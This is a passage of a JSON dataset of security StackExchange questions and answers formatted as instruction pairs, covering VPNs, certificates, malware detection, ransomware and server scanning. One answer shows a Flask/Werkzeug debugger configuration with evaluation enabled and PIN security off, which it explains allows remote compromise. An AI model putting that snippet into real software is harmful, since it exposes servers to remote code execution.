      "answer": "signsrch by Luigi Auriemma has signatures for tables used in common compression libraries (zlib etc.). \n\nIt has been ported as plugins for ImmDbg and IDA.\nHe also has the offzip tool which tries to identify and unpack compressed streams inside a binary."
    }
  },
  {
    "instruction": "Please answer this question: Website seeing my Facebook data?\nI recently visited opensecrets.org and was surprised to see a message box in the lower right corner of the window asking if I wanted to talk, and displaying my name. \nThe pop-up says Chat with opensecrets.org in Messenger.\nAs far as I know, I haven't allowed Facebook to share any data with this site, so how does this website know my name?",
    "context": "",
    "output": "I went on that website and this is what I saw:\n\nThey are using the Customer Chat Plugin from Facebook.\nThey don't know your name, they're just embedding an iframe to allow you to speak with their Facebook page's administrator(s).\nOnly Facebook knows who you are.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Website seeing my Facebook data?\nI recently visited opensecrets.org and was surprised to see a message box in the lower right corner of the window asking if I wanted to talk, and displaying my name. \nThe pop-up says Chat with opensecrets.org in Messenger.\nAs far as I know, I haven't allowed Facebook to share any data with this site, so how does this website know my name?",
      "answer": "I went on that website and this is what I saw:\n\nThey are using the Customer Chat Plugin from Facebook.\nThey don't know your name, they're just embedding an iframe to allow you to speak with their Facebook page's administrator(s).\nOnly Facebook knows who you are."
    }
  },
  {
    "instruction": "Question: What was state of the art knowledge on security of speculative evaluation when it was introduced to Intel CPUs?\nMany sources claim that almost all Intel x86 CPUs back to Pentium Pro are vulnerable to the Meltdown attack. Pentium Pro was introduced to the market in 1995.\nWhat was the state of the art knowledge on security of speculative evaluation, the basis for the Meltdown attack, at that time?",
    "context": "",
    "output": "Answer: The state of the art was non-existent.\nAt the time of the Pentium Pro, the World Wide Web was four years old.  Widespread use of shared hosting was about ten years in the future; if you suggested that people would want to run untrusted code provided by random third parties, they'd look at you like you'd grown a second head.  Memory protection was about preventing one crashing program from taking down the whole system, not about letting programs hide data from one another.  Speculative execution was not seen as having any security implications whatsoever -- it was simply a way of avoiding performance-killing pipeline stalls.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What was state of the art knowledge on security of speculative evaluation when it was introduced to Intel CPUs?\nMany sources claim that almost all Intel x86 CPUs back to Pentium Pro are vulnerable to the Meltdown attack. Pentium Pro was introduced to the market in 1995.\nWhat was the state of the art knowledge on security of speculative evaluation, the basis for the Meltdown attack, at that time?",
      "answer": "The state of the art was non-existent.\nAt the time of the Pentium Pro, the World Wide Web was four years old.  Widespread use of shared hosting was about ten years in the future; if you suggested that people would want to run untrusted code provided by random third parties, they'd look at you like you'd grown a second head.  Memory protection was about preventing one crashing program from taking down the whole system, not about letting programs hide data from one another.  Speculative execution was not seen as having any security implications whatsoever -- it was simply a way of avoiding performance-killing pipeline stalls."
    }
  },
  {
    "instruction": "Answer the question below.\nWhy do some HTTPS-enabled websites use HTTP by default?\nSome sites like Stack Exchange have an HTTPS version available. But when I type their address or go to them via Google, I get an unencrypted version.\nThis seems to render the HTTPS version totally useless, as most users (maybe not on SE) will use the unsecure version without even noticing.\nI don't know of any modern desktop or mobile browser that doesn't support HTTPS. So why are these websites even keeping an HTTPS version, and using it by default ?",
    "context": "",
    "output": "It is simply open to accepting secured and unsecured connections.  \nSince HTTPS increases the processing and bandwidth requirements, forcing it in situations that really don't justify it only costs more to every one.\nForcing it would also require a redirect, which would make the user experience an even longer load time because of that.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why do some HTTPS-enabled websites use HTTP by default?\nSome sites like Stack Exchange have an HTTPS version available. But when I type their address or go to them via Google, I get an unencrypted version.\nThis seems to render the HTTPS version totally useless, as most users (maybe not on SE) will use the unsecure version without even noticing.\nI don't know of any modern desktop or mobile browser that doesn't support HTTPS. So why are these websites even keeping an HTTPS version, and using it by default ?",
      "answer": "It is simply open to accepting secured and unsecured connections.  \nSince HTTPS increases the processing and bandwidth requirements, forcing it in situations that really don't justify it only costs more to every one.\nForcing it would also require a redirect, which would make the user experience an even longer load time because of that."
    }
  },
  {
    "instruction": "What is the answer to this question - understanding the point of VPNs\nI can't really understand the concept of VPNs, since we already have various secure transmission protocols.\nIsn't the point of VPNs that people using its 'channels' can send encrypted data to each other?\nAt the end, isn't it just one client and one server trying to exchange data securely?\nWe have SSL/TLS for that and many other secure data transfer methods, don't we?\nWhat s the point of using a distinct client software, server software, etc... to access the private network?\nWhat am I missing?\n\n",
    "context": "",
    "output": "A private netowrk is a network consisting of cables and computers which are physically separated from the rest of the World. This makes for good security, and, furthermore, convincingly good security (having security is part of the goal, but you also want to know it).\nA VPN is the cheap emulation of a private network: the wires are still linked with the Internet; the isolation is done with mathematics (cryptography) instead of physics.\nCompared to \"secure transmission protocols\" (which work), the good point of a VPN is that it works at the OS level: as the system administrator, you configure the VPN once, and it protects the data transfer from all the applications, regardless of how poorly these applications were designed. Doing a proper SSL/TLS is not easy; for instance, many applications don't check for certificate revocation. Even if applications do the work correctly, going through the configuration of all of them is tiresome. A VPN saves time, so the sysadmin can more easily concentrate on ongoing attacks or other crucial tasks like resetting users' passwords or \"continuous Internet-based training\" (aka Websurfing).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "understanding the point of VPNs\nI can't really understand the concept of VPNs, since we already have various secure transmission protocols.\nIsn't the point of VPNs that people using its 'channels' can send encrypted data to each other?\nAt the end, isn't it just one client and one server trying to exchange data securely?\nWe have SSL/TLS for that and many other secure data transfer methods, don't we?\nWhat s the point of using a distinct client software, server software, etc... to access the private network?\nWhat am I missing?",
      "answer": "A private netowrk is a network consisting of cables and computers which are physically separated from the rest of the World. This makes for good security, and, furthermore, convincingly good security (having security is part of the goal, but you also want to know it).\nA VPN is the cheap emulation of a private network: the wires are still linked with the Internet; the isolation is done with mathematics (cryptography) instead of physics.\nCompared to \"secure transmission protocols\" (which work), the good point of a VPN is that it works at the OS level: as the system administrator, you configure the VPN once, and it protects the data transfer from all the applications, regardless of how poorly these applications were designed. Doing a proper SSL/TLS is not easy; for instance, many applications don't check for certificate revocation. Even if applications do the work correctly, going through the configuration of all of them is tiresome. A VPN saves time, so the sysadmin can more easily concentrate on ongoing attacks or other crucial tasks like resetting users' passwords or \"continuous Internet-based training\" (aka Websurfing)."
    }
  },
  {
    "instruction": "Answer the following question:\n\nGenerate CSR with 2 OU Names\nI have to create an application which generates a CSR. While generating a CSR we are required to fill in several details like CN, OU, etc. The problem is that the Certifying Authority to which I have to send my CSR wants 2 OU(Organizational Unit) Names. I googled a lot but couldn't find anything using either openssl or java keytool by which I can specify 2 OU Names.\nCan someone please tell me how I can specify 2 OU Names while generating the CSR?",
    "context": "",
    "output": "You can do this easily with openssl:\nopenssl req -new -out myserver.csr \\\n  -newkey rsa:2048 -sha1 -nodes -keyout myserver.key  \\\n  -subj \"/C=US/ST=New York/L=New York/O=My Company/OU=1st OU/OU=2nd OU/CN=www.myserver.net\"\n\n(If you already have a key you wish to use, omit -newkey rsa:2048 -sha1 -nodes and use -key myserver.key instead of -keyout ...)\nYou can inspect the CSR before you submit it with:\nopenssl req -in myserver.csr  -noout -text",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Generate CSR with 2 OU Names\nI have to create an application which generates a CSR. While generating a CSR we are required to fill in several details like CN, OU, etc. The problem is that the Certifying Authority to which I have to send my CSR wants 2 OU(Organizational Unit) Names. I googled a lot but couldn't find anything using either openssl or java keytool by which I can specify 2 OU Names.\nCan someone please tell me how I can specify 2 OU Names while generating the CSR?",
      "answer": "You can do this easily with openssl:\nopenssl req -new -out myserver.csr \\\n  -newkey rsa:2048 -sha1 -nodes -keyout myserver.key  \\\n  -subj \"/C=US/ST=New York/L=New York/O=My Company/OU=1st OU/OU=2nd OU/CN=www.myserver.net\"\n\n(If you already have a key you wish to use, omit -newkey rsa:2048 -sha1 -nodes and use -key myserver.key instead of -keyout ...)\nYou can inspect the CSR before you submit it with:\nopenssl req -in myserver.csr  -noout -text"
    }
  },
  {
    "instruction": "Answer the question below.\nFlask debug=True exploitation\nIt's a well known fact that Flask's debug=True option can lead to remote code execution via werkzeug debugger capabilities and even several resources were hacked. I decided to look into it and it turned out that the technique doesn't work if the app is being run by a forking application server like uwsgi or gunicorn. So the questions are:\n\nIs there an opportunity to exploit Flask application with debug=True enabled even if it's being run by a forking application server (gunicorn, uwsgi)? I can't believe that all this hacked resources used built-in Flask's web server in production.\nDid all that hacked sites run Flask app directly without using \"standard\" approach like nginx + gunicorn/uwsgi + Flask?",
    "context": "",
    "output": "If we enable the debugger with this code:\napp = flask.Flask(__name__)\napp.debug = True\n\nThat only enables the debugger with the built-in dev server. To use the Werkzeug debugger with another WSGI server, we have to explicitly include the middleware:\nfrom werkzeug.debug import DebuggedApplication \nfrom waitress import serve\napp = DebuggedApplication(app, evalex=True, pin_security=False)\nserve(app, listen='*:8080')\n\nWhen you do this, with evalex and pin_security options as above, the app is trivially vulnerable to remote compromise.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Flask debug=True exploitation\nIt's a well known fact that Flask's debug=True option can lead to remote code execution via werkzeug debugger capabilities and even several resources were hacked. I decided to look into it and it turned out that the technique doesn't work if the app is being run by a forking application server like uwsgi or gunicorn. So the questions are:\n\nIs there an opportunity to exploit Flask application with debug=True enabled even if it's being run by a forking application server (gunicorn, uwsgi)? I can't believe that all this hacked resources used built-in Flask's web server in production.\nDid all that hacked sites run Flask app directly without using \"standard\" approach like nginx + gunicorn/uwsgi + Flask?",
      "answer": "If we enable the debugger with this code:\napp = flask.Flask(__name__)\napp.debug = True\n\nThat only enables the debugger with the built-in dev server. To use the Werkzeug debugger with another WSGI server, we have to explicitly include the middleware:\nfrom werkzeug.debug import DebuggedApplication \nfrom waitress import serve\napp = DebuggedApplication(app, evalex=True, pin_security=False)\nserve(app, listen='*:8080')\n\nWhen you do this, with evalex and pin_security options as above, the app is trivially vulnerable to remote compromise."
    }
  },
  {
    "instruction": "Answer this question:\n\nWhy don't browsers trust the US Treasury?\n(inspired by How do you tell a website they have expired security certificates? )\nWhy don't major browsers trust the US Treasury PKI certificate authority by default?  I know that the government isn't necessarily trustworthy, but surely they're at least as trustworthy as 'GoDaddy.com'.  Are there technical or systemic deficiencies in the US government's granting of certs or is this based on something else?",
    "context": "",
    "output": "A: It is not that the browsers are unwilling to include this PKI. But they will only include a PKI which gets regular audits and fully conforms to the rules of the CAB browser forum. Acording to this bug inclusion process in the Mozilla trust store (i.e. Firefox) was started 8 years ago and is still an ongoing process. For all the details see the bug itself.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why don't browsers trust the US Treasury?\n(inspired by How do you tell a website they have expired security certificates? )\nWhy don't major browsers trust the US Treasury PKI certificate authority by default?  I know that the government isn't necessarily trustworthy, but surely they're at least as trustworthy as 'GoDaddy.com'.  Are there technical or systemic deficiencies in the US government's granting of certs or is this based on something else?",
      "answer": "It is not that the browsers are unwilling to include this PKI. But they will only include a PKI which gets regular audits and fully conforms to the rules of the CAB browser forum. Acording to this bug inclusion process in the Mozilla trust store (i.e. Firefox) was started 8 years ago and is still an ongoing process. For all the details see the bug itself."
    }
  },
  {
    "instruction": "Answer the question below.\nWhat tools exist to manage large scale firewall rulesets?\nFor an enterprise firewall you may have over 50 thousand rules. With typical errors in firewall rules including things like mistyped network masks you couldn't hope to manually review the release.\nSo what tools are available? Free or otherwise.",
    "context": "",
    "output": "Tufin and Firemon are the major players here.  I do not have experience with Firemon, but Tufin makes a solid product.  (I do not hold financial interest in Tufin, but am a customer).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What tools exist to manage large scale firewall rulesets?\nFor an enterprise firewall you may have over 50 thousand rules. With typical errors in firewall rules including things like mistyped network masks you couldn't hope to manually review the release.\nSo what tools are available? Free or otherwise.",
      "answer": "Tufin and Firemon are the major players here.  I do not have experience with Firemon, but Tufin makes a solid product.  (I do not hold financial interest in Tufin, but am a customer)."
    }
  },
  {
    "instruction": "Answer the question below.\nVirus - by-pass with binairies repackaging\nWhy don\u2019t \u00ab hackers \u00bb (or more accurately, \u00ab virus maker \u00bb) just do repackaging over their malware to by-pass antivirus software? Because it resolves the issue of the virus signature (kind of hash), doesn\u2019t it ?\nHow can anti-virus software detect these kinds of easy modifications?",
    "context": "",
    "output": "File hashes are by far not the most helpful method of detecting malware (unlike a couple of decades ago). Today, malware recognition (and sometimes classification) is heavily based on real-time heuristical analysis of its operations. This analysis deals with lots of data, which mostly consists of the system calls performed by the application, and their order. The system calls are tracked via a technique called hooking.\nOf course, other things are taken into account. For example, most malware authors out there fail dramatically with their packers and cryptors, making it obvious that a file was, well, packed/crypted. And some just use well-known packers/cryptors that generate files which are easily recognized by antiviruses.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Virus - by-pass with binairies repackaging\nWhy don\u2019t \u00ab hackers \u00bb (or more accurately, \u00ab virus maker \u00bb) just do repackaging over their malware to by-pass antivirus software? Because it resolves the issue of the virus signature (kind of hash), doesn\u2019t it ?\nHow can anti-virus software detect these kinds of easy modifications?",
      "answer": "File hashes are by far not the most helpful method of detecting malware (unlike a couple of decades ago). Today, malware recognition (and sometimes classification) is heavily based on real-time heuristical analysis of its operations. This analysis deals with lots of data, which mostly consists of the system calls performed by the application, and their order. The system calls are tracked via a technique called hooking.\nOf course, other things are taken into account. For example, most malware authors out there fail dramatically with their packers and cryptors, making it obvious that a file was, well, packed/crypted. And some just use well-known packers/cryptors that generate files which are easily recognized by antiviruses."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Someone knows my IP and is threatening to DDoS me\nAround 4 months ago, someone learned my IP, and is threatening to DDoS attack me if I am not his slave. He was breaking the Discord TOS with all kinds of stuff in my DMs. I blocked him, but one of his friends told me to friend him back, or he will DDoS me.\nWhat should I do?",
    "context": "",
    "output": "answer: Nothing.\nHe's trying to scare you into doing what he wants, but he has no means of harming you by knowing your IP. Feel free to block him and disregard anything he says.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Someone knows my IP and is threatening to DDoS me\nAround 4 months ago, someone learned my IP, and is threatening to DDoS attack me if I am not his slave. He was breaking the Discord TOS with all kinds of stuff in my DMs. I blocked him, but one of his friends told me to friend him back, or he will DDoS me.\nWhat should I do?",
      "answer": "Nothing.\nHe's trying to scare you into doing what he wants, but he has no means of harming you by knowing your IP. Feel free to block him and disregard anything he says."
    }
  },
  {
    "instruction": "Answer this question:\n\nGiving remote access via the VM, will compromise the network?\nI am currently working on a project for one of the organization and I have to install a new (server/client)software program.However, the software company would like to help and install for themselves to minimize any problems on our server.\nAccording to the organization ICT rule, we couldn't give remote access to the outsider. They have suggested installing VM then give remote access to them. \nHowever, I feel that even if we give remote access via VM, would they still able to access our network or it is possible to allow them?\nThanks.",
    "context": "",
    "output": "A: If your VM has access to the network and they can use it unsupervised then they of course have access to your network. \nAlso you really have to trust your VM-Product there.\nWhat people do a lot (no judgement here) is isolating a machine using the Firewall/Packetfilter/Security-Gateway for \"outsiders\". \nAnyways: If your companies ICT rules say, you cannot give remote access to outsiders you are pretty much given all information you need. Don't do it. You might run into legal trouble as well as all of the other problems that this rule was made up for.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Giving remote access via the VM, will compromise the network?\nI am currently working on a project for one of the organization and I have to install a new (server/client)software program.However, the software company would like to help and install for themselves to minimize any problems on our server.\nAccording to the organization ICT rule, we couldn't give remote access to the outsider. They have suggested installing VM then give remote access to them. \nHowever, I feel that even if we give remote access via VM, would they still able to access our network or it is possible to allow them?\nThanks.",
      "answer": "If your VM has access to the network and they can use it unsupervised then they of course have access to your network. \nAlso you really have to trust your VM-Product there.\nWhat people do a lot (no judgement here) is isolating a machine using the Firewall/Packetfilter/Security-Gateway for \"outsiders\". \nAnyways: If your companies ICT rules say, you cannot give remote access to outsiders you are pretty much given all information you need. Don't do it. You might run into legal trouble as well as all of the other problems that this rule was made up for."
    }
  },
  {
    "instruction": "Rogue network printers as an attack vector in windows\nI recently installed a new printer in our network. Just because I was interested, I switched to wireshark when scanning for and adding the printer on windows. I noticed that it was discoverd through mdns and then instructed windows to download some drivers in form of dll files. Now I wonder: What if I would setup a rogue udp server that listens for mdns queries and then responds with a fake printer service that sends malicous dlls to windows hosts. Since they are automatically \"installed\" (and executed?), it would provide a very good way into a system. I also wonder how one could fix this (issue?) without breaking the comfort this feature gives users.\nI tried to setup a socket that listens for mdns queries to respond to in python3, but cannot get it to work. And before wasting much more of my time. I figured I'll ask about this attack vector here.",
    "context": "",
    "output": "Windows only automatically installs drivers that have been digitally signed. Unsigned drivers, drivers that have invalid signatures and drivers that have been signed by untrusted publishers are not installed automatically. Instead, if the user is an Administrator, they are given a warning message informing them that the driver is unsigned or has been altered (and then are given the option to quit installation or continue anyways). Standard users are not given any option and the driver is not installed.\nSo to successfully install a driver the way you suggest, you would either have to compromise the private key of a vendor that Windows trusts, or somehow manage to get your own certificate onto Windows list of trusted publishers.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Rogue network printers as an attack vector in windows\nI recently installed a new printer in our network. Just because I was interested, I switched to wireshark when scanning for and adding the printer on windows. I noticed that it was discoverd through mdns and then instructed windows to download some drivers in form of dll files. Now I wonder: What if I would setup a rogue udp server that listens for mdns queries and then responds with a fake printer service that sends malicous dlls to windows hosts. Since they are automatically \"installed\" (and executed?), it would provide a very good way into a system. I also wonder how one could fix this (issue?) without breaking the comfort this feature gives users.\nI tried to setup a socket that listens for mdns queries to respond to in python3, but cannot get it to work. And before wasting much more of my time. I figured I'll ask about this attack vector here.",
      "answer": "Windows only automatically installs drivers that have been digitally signed. Unsigned drivers, drivers that have invalid signatures and drivers that have been signed by untrusted publishers are not installed automatically. Instead, if the user is an Administrator, they are given a warning message informing them that the driver is unsigned or has been altered (and then are given the option to quit installation or continue anyways). Standard users are not given any option and the driver is not installed.\nSo to successfully install a driver the way you suggest, you would either have to compromise the private key of a vendor that Windows trusts, or somehow manage to get your own certificate onto Windows list of trusted publishers."
    }
  },
  {
    "instruction": "Can you tell me the answer to: What does EIP stand for?\nThere are a ton of questions on here that make reference to the eip:\n\nHow can I partially overwrite the EIP in order to bypass ASLR?\nUnable to overwrite EIP register\nDo I always have to overwrite EIP to get to write on the stack in a buffer overflow?\nEtc.\n\nWhat is the EIP? How is it used, both as an exploit target and in benign code?",
    "context": "",
    "output": "answer: EIP is a register in x86 architectures (32bit). It holds the \"Extended Instruction Pointer\" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.\nResearch Assembly language to get a better understanding of how registers work. Skull Security has a good primer.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What does EIP stand for?\nThere are a ton of questions on here that make reference to the eip:\n\nHow can I partially overwrite the EIP in order to bypass ASLR?\nUnable to overwrite EIP register\nDo I always have to overwrite EIP to get to write on the stack in a buffer overflow?\nEtc.\n\nWhat is the EIP? How is it used, both as an exploit target and in benign code?",
      "answer": "EIP is a register in x86 architectures (32bit). It holds the \"Extended Instruction Pointer\" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.\nResearch Assembly language to get a better understanding of how registers work. Skull Security has a good primer."
    }
  },
  {
    "instruction": "Can you tell me the answer to: What are the possibilities for reverse engineering an IPA file to its source?\nI browsed a lot, but can't find any resources for reverse engineering an IPA file (iPhone application). Is there any method to reverse engineer an IPA file to its source? I've tried to rename it to zip and open it via Winrar/Winzip to view its source, but it doesn't seem helpful.\nWhat are the possibilities to decompile/reverse engineer an IPA file to its source code?",
    "context": "",
    "output": "answer: I would recommend checking out Frida. It's an open source instrumentation toolkit for iOS, Android, Windows, Mac and Linux.\nCheck out this tutorial to dive in by building your own debugger in 5 minutes using Frida and Qml. The last part shows how to inject code into the \u201cYo\u201d app and plot its network connections on Google Maps.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are the possibilities for reverse engineering an IPA file to its source?\nI browsed a lot, but can't find any resources for reverse engineering an IPA file (iPhone application). Is there any method to reverse engineer an IPA file to its source? I've tried to rename it to zip and open it via Winrar/Winzip to view its source, but it doesn't seem helpful.\nWhat are the possibilities to decompile/reverse engineer an IPA file to its source code?",
      "answer": "I would recommend checking out Frida. It's an open source instrumentation toolkit for iOS, Android, Windows, Mac and Linux.\nCheck out this tutorial to dive in by building your own debugger in 5 minutes using Frida and Qml. The last part shows how to inject code into the \u201cYo\u201d app and plot its network connections on Google Maps."
    }
  },
  {
    "instruction": "What is the answer to this question - Where to disclose a zero day vulnerability\nWe discovered a vulnerability in wide range of Ricoh printers, where with a simple PostScript file sent directly, it is possible to crash the device.\nTo recover you need physical access to the printer and an administration account to clear the queue (otherwise, after the restart, the crash will occur again).\nThis offers a simple and quick denial of service attack. If you are in the right network, you can disable all the printers within seconds.\nWe tried to contact Ricoh for months (but we were more or less silently ignored) and we finally where able to speak with the responsible person in our country. He stated that he does not see the problem.\nGiven that we are following the rules of responsible disclosure (Ricoh was warned month ago) and that they clearly stated that they will not address the problem: where should we disclose the problem?\n\n",
    "context": "",
    "output": "If you want to disclose a vulnerability I would suggest to contact the right CNA. You can find a list under this link. Now you can request a CVE ID and everything goes on if this vulnerability is really existing.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Where to disclose a zero day vulnerability\nWe discovered a vulnerability in wide range of Ricoh printers, where with a simple PostScript file sent directly, it is possible to crash the device.\nTo recover you need physical access to the printer and an administration account to clear the queue (otherwise, after the restart, the crash will occur again).\nThis offers a simple and quick denial of service attack. If you are in the right network, you can disable all the printers within seconds.\nWe tried to contact Ricoh for months (but we were more or less silently ignored) and we finally where able to speak with the responsible person in our country. He stated that he does not see the problem.\nGiven that we are following the rules of responsible disclosure (Ricoh was warned month ago) and that they clearly stated that they will not address the problem: where should we disclose the problem?",
      "answer": "If you want to disclose a vulnerability I would suggest to contact the right CNA. You can find a list under this link. Now you can request a CVE ID and everything goes on if this vulnerability is really existing."
    }
  },
  {
    "instruction": "Question: How does ransomware get the permissions to encrypt your disk?\nRecently, my employer blocked access to Gmail, Yahoo Mail, etc., because an employee downloaded an email attachment which contained ransomware and got their disk encrypted.  \nQUESTION : How does ransomware get the root/admin permissions to encrypt your disk?  Presumably, the person who downloaded it had to have entered the admin/root password at some point.",
    "context": "",
    "output": "Answer: Ransomware doesn't get root/admin permissions, because it does not need to.\nIt does not encrypt the disk or files protected by the operating system (executables, configuration, credentials), it encrypts files created and stored by the users (data); and all it requires to do so, is the same level of access as the users themselves.\nJust like a user would create a password-protected zip and delete the original file, so does ransomware (except, it keeps the password in secret and makes sure the original file is really inaccessible).\nThat's the whole reason why ransomware is so successful, it encrypts what is the most valuable for users and companies: their work.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does ransomware get the permissions to encrypt your disk?\nRecently, my employer blocked access to Gmail, Yahoo Mail, etc., because an employee downloaded an email attachment which contained ransomware and got their disk encrypted.  \nQUESTION : How does ransomware get the root/admin permissions to encrypt your disk?  Presumably, the person who downloaded it had to have entered the admin/root password at some point.",
      "answer": "Ransomware doesn't get root/admin permissions, because it does not need to.\nIt does not encrypt the disk or files protected by the operating system (executables, configuration, credentials), it encrypts files created and stored by the users (data); and all it requires to do so, is the same level of access as the users themselves.\nJust like a user would create a password-protected zip and delete the original file, so does ransomware (except, it keeps the password in secret and makes sure the original file is really inaccessible).\nThat's the whole reason why ransomware is so successful, it encrypts what is the most valuable for users and companies: their work."
    }
  },
  {
    "instruction": "Question: Analysing malware in a real environment (non-virtual environment)\nI have analysed malware previously using Cuckoo Sandbox, however, I've seen that some malware won't run as they detect they are actually running in a virtual environment (they implement some anti-virtualisation techniques). So what I was thinking is running the malware in a real environment instead and then rolling back to the clean state using a clean copy of the system. I just want to check the following:\n\nIs this the proper way to analyse malware which implements\nanti-virtualisation techniques or there are other ways that usually are followed? \nIs there a specific program that is widely used by\nmalware analysers to retain a copy of the clean system state, and\nre-install it? (I am interested in Windows malware only)",
    "context": "",
    "output": "Answer: Yes this is an approach that is commonly used. \nFaronics Deep Freeze is an interesting software to do erase changes on reboot, but is itself subject to detection. Clonezilla is a good imaging tool and is quite simple to use. The best setup I have seen is booting an image from RAM using Intel AMT, this makes the imaging process much faster.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Analysing malware in a real environment (non-virtual environment)\nI have analysed malware previously using Cuckoo Sandbox, however, I've seen that some malware won't run as they detect they are actually running in a virtual environment (they implement some anti-virtualisation techniques). So what I was thinking is running the malware in a real environment instead and then rolling back to the clean state using a clean copy of the system. I just want to check the following:\n\nIs this the proper way to analyse malware which implements\nanti-virtualisation techniques or there are other ways that usually are followed? \nIs there a specific program that is widely used by\nmalware analysers to retain a copy of the clean system state, and\nre-install it? (I am interested in Windows malware only)",
      "answer": "Yes this is an approach that is commonly used. \nFaronics Deep Freeze is an interesting software to do erase changes on reboot, but is itself subject to detection. Clonezilla is a good imaging tool and is quite simple to use. The best setup I have seen is booting an image from RAM using Intel AMT, this makes the imaging process much faster."
    }
  },
  {
    "instruction": "Question: How to check if the decryption is correct?\nI'm working on chat room that encrypt messages for more than one users and each user might have different encryption and key/password. The user's key won't work with all the message, therefore; return errors.\nvar message =\"secret message\";\nvar encrypted = CryptoJS.AES.encrypt(message, \"Secret Passphrase\");\ntry {\n    var decrypted = CryptoJS.AES.decrypt(encrypted, \"Secret Passphrase123\").toString(CryptoJS.enc.Utf8);\n    if (decrypted.length > 0) {\n        alert(decrypted);\n    } else {\n        alert(\"false\");\n    }\n} catch(e) {\n    alert(\"false\");\n}\n\nI'm currently catching the error, but sometimes the decryption returns with jumbled up letters and symbols. The current way I'm doing this is not efficient. Is there a better way?\nI ask this question earilier on stackoverflow, but they suggested that I might have bette luck here.",
    "context": "",
    "output": "Answer: Just use an authenticated mode like GCM. Not only will this\u00a0tell you whether or not the correct key was used to decrypt, but it prevents message-tampering attacks, the worst of which can allow attackers to completely decrypt encrypted messages.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to check if the decryption is correct?\nI'm working on chat room that encrypt messages for more than one users and each user might have different encryption and key/password. The user's key won't work with all the message, therefore; return errors.\nvar message =\"secret message\";\nvar encrypted = CryptoJS.AES.encrypt(message, \"Secret Passphrase\");\ntry {\n    var decrypted = CryptoJS.AES.decrypt(encrypted, \"Secret Passphrase123\").toString(CryptoJS.enc.Utf8);\n    if (decrypted.length > 0) {\n        alert(decrypted);\n    } else {\n        alert(\"false\");\n    }\n} catch(e) {\n    alert(\"false\");\n}\n\nI'm currently catching the error, but sometimes the decryption returns with jumbled up letters and symbols. The current way I'm doing this is not efficient. Is there a better way?\nI ask this question earilier on stackoverflow, but they suggested that I might have bette luck here.",
      "answer": "Just use an authenticated mode like GCM. Not only will this\u00a0tell you whether or not the correct key was used to decrypt, but it prevents message-tampering attacks, the worst of which can allow attackers to completely decrypt encrypted messages."
    }
  },
  {
    "instruction": "How do attackers find the IP addresses of recently deployed servers?\nAbout two months ago, I deployed an Ubuntu server with as main purpose serving a web app. However, I'm still developing the app and only gave the server IP to my coworker and some friends for testing.  \nYesterday I checked the fail2ban logs and noticed many SSH bruteforce attempts from China, France etc. that dated to before I gave out the IP. I also checked my server access logs and noticed some malicious attempts on URLs from the same IPs, trying to bruteforce SSH. One example of a request they made is myip/otherip/file.php. I'm not sure how to interpret this. I traced back the IP of that server and it's on the same hosting company I'm on.\nQuestion: How did they find out about the IP of the server before I even served the app from it or gave it out?\nMy guess: I'm guessing it is some bot that keeps trying on different IPs of some pattern that leads to servers of the same hosting company. Is that a correct assumption, or are there other possibilities?",
    "context": "",
    "output": "All servers using IPv4 addresses get some level of background noise in the form of automated scanning and bruteforce attempts. This is basically because it is easy to scan the entire address space - it takes less than an hour, and can result in systems which haven't been fully patched or set up yet.\nAs a result, I would fully expect any system to see lots of this kind of traffic. This is why it is important to sort out your security before opening your server to the internet. Keep your firewall turned on, blocking any incoming traffic whilst setting it up. Restrict access to know IP addresses for testing. Once you are sure it's secure, then you can open the firewall to the rest of the internet to connect.\nIf you have a server with a reverse DNS lookup set, once someone has the IP address, they can look to see what domain name your system thinks it belongs to, hence the URL attempts too.\nBasically, if you have made sure your system is secure, don't worry - make sure you've got decent passwords for SSH (or, better yet, key-based login), and that any other services are locked down properly. If you haven't, or you think they got in, treat it like a compromised server - sort out your firewall (probably with your hosting provider) and then start over.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do attackers find the IP addresses of recently deployed servers?\nAbout two months ago, I deployed an Ubuntu server with as main purpose serving a web app. However, I'm still developing the app and only gave the server IP to my coworker and some friends for testing.  \nYesterday I checked the fail2ban logs and noticed many SSH bruteforce attempts from China, France etc. that dated to before I gave out the IP. I also checked my server access logs and noticed some malicious attempts on URLs from the same IPs, trying to bruteforce SSH. One example of a request they made is myip/otherip/file.php. I'm not sure how to interpret this. I traced back the IP of that server and it's on the same hosting company I'm on.\nQuestion: How did they find out about the IP of the server before I even served the app from it or gave it out?\nMy guess: I'm guessing it is some bot that keeps trying on different IPs of some pattern that leads to servers of the same hosting company. Is that a correct assumption, or are there other possibilities?",
